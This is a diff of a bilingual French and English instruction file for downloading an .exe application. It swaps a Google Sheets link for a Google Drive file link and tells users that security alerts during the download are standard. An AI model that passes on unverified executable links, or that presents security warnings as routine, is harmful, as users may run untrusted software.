@@ -2,7 +2,7 @@ Consigne pour télécharger le .exe
 
 Vous pouvez télécharger l’application .exe avec ce lien :
 
-https://docs.google.com/spreadsheets/d/1fkPKhW3jtuWr8FPQf5NGJyOk4WXdfzNf9Bvbh_4ifS4/edit?usp=sharing
+https://drive.google.com/file/d/19D168m6MGTt_AvP4NuA995brggKlUT5D/view?usp=drive_link
 
 Veuillez noter qu’il est possible que votre ordinateur émette une alerte lors du téléchargement. 
 C’est une procédure de sécurité standard pour les fichiers téléchargés sur Internet, en particulier
@@ -15,7 +15,7 @@ Rules for .exe download
 
 You can download the .exe application with this link:
 
-https://docs.google.com/spreadsheets/d/1fkPKhW3jtuWr8FPQf5NGJyOk4WXdfzNf9Bvbh_4ifS4/edit?usp=sharing
+https://drive.google.com/file/d/19D168m6MGTt_AvP4NuA995brggKlUT5D/view?usp=drive_link
 
 Please note that your computer may issue an alert during the download. This is a standard security procedure for files downloaded from the Internet,
 especially for executable files.
